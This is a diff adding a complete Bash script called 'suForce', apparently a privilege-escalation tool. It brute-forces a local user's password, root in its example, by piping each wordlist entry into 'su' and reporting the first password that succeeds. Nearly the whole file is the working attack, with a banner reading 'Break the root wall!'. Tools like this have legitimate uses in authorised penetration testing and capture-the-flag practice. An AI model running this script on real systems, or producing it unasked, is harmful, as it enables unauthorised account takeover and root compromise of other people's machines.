@@ -1,0 +1,99 @@
+#!/bin/bash
+
+# ┌────────────────────────────────────────────┐
+# │           suForce - by AzK-os              │
+# └────────────────────────────────────────────┘
+
+readonly RED="\e[91m"
+readonly GREEN="\e[92m"
+readonly YELLOW="\e[93m"
+readonly BLUE="\e[94m"
+readonly WHITE="\e[97m"
+readonly END="\e[0m"
+readonly SEPARATOR="${WHITE}──────────────────────────────────────────────${END}"
+
+trap ctrl_c INT
+
+function banner(){
+  echo -e "${BLUE}"
+  echo -e "   ╔═══════════════════════════════════════╗"
+  echo -e "   ║       🚀 suForce Brute Tool 🚀        ║"
+  echo -e "   ║         Created by ${YELLOW}AzK-os${BLUE}          ║"
+  echo -e "   ╚═══════════════════════════════════════╝"
+  echo -e "${RED}"
+  echo -e "        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     "
+  echo -e "        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█     "
+  echo -e "        █   ${WHITE}Break the root wall!${RED}   █     "
+  echo -e "        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█     "
+  echo -e "${END}${SEPARATOR}"
+  echo -e " 🧪 Tool: ${GREEN}suForce${END}       Version: ${GREEN}v2.0 by AzK-os${END}"
+  echo -e "${SEPARATOR}"
+}
+
+function help(){
+  echo -e "❓ ${WHITE}Usage:${END} suForce [OPTIONS]\n"
+  echo -e "🌐 Try brute-forcing user password using ${YELLOW}su${END} command.\n"
+  echo -e "📋 ${WHITE}Options:${END}"
+  echo -e "   -u <USER>      ${YELLOW}Username${END} to brute force."
+  echo -e "   -w <WORDLIST>  ${YELLOW}Path${END} to the wordlist."
+  echo -e "   -h             Show this help message.\n"
+  echo -e "💡 ${WHITE}Examples:${END}"
+  echo -e "   suForce -u root -w /usr/share/wordlists/rockyou.txt"
+  echo -e "   suForce -h"
+  echo -e "${SEPARATOR}\n"
+}
+
+function info(){
+  echo -e "🎯 Username: ${BLUE}${USERNAME}${END}"
+  echo -e "📖 Wordlist: ${BLUE}${WORDLIST}${END}"
+  echo -e "${SEPARATOR}"
+}
+
+function ctrl_c(){
+  echo -e "\n${RED}❌ Interrupt received. Exiting...${END}"
+  tput cnorm
+  exit 1
+}
+
+while getopts ":u:w:h" ARG; do
+  case ${ARG} in
+    u) USERNAME=$OPTARG; let parameter_counter+=1 ;;
+    w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
+    h) banner; help; exit 0 ;;
+  esac
+done
+
+if [[ -n "${USERNAME}" && -n "${WORDLIST}" ]]; then
+  banner
+  info
+else
+  banner
+  help
+  exit 0
+fi
+
+if [ ! -f "${WORDLIST}" ]; then
+  echo -e "${RED}❗ Wordlist not found: ${WORDLIST}${END}"
+  exit 1
+fi
+
+LINES=$(wc -l < "${WORDLIST}")
+LINE=0
+
+while IFS= read -r PASSWORD; do
+  LINE=$((LINE + 1))
+  PROGRESS=$((LINE * 100 / LINES))
+  echo -ne "\e[?25l\r\033[K🔎 ${WHITE}Status${END} | ${YELLOW}${LINE}/${LINES} ${PROGRESS}% → ${PASSWORD}${END}"
+  echo "${PASSWORD}" | timeout 0.3 su ${USERNAME} -c "whoami" &>/dev/null
+  if [ $? -eq 0 ]; then
+    echo -e "\n\n💥 ${GREEN}Password Found!${END} → ${GREEN}${PASSWORD}${END}"
+    echo -e "${SEPARATOR}\n"
+    tput cnorm
+    exit 0
+  fi
+done < "${WORDLIST}"
+
+echo -e "\n❗ ${RED}Password not found.${END}"
+echo -e "${SEPARATOR}\n"
+tput cnorm
+exit 1
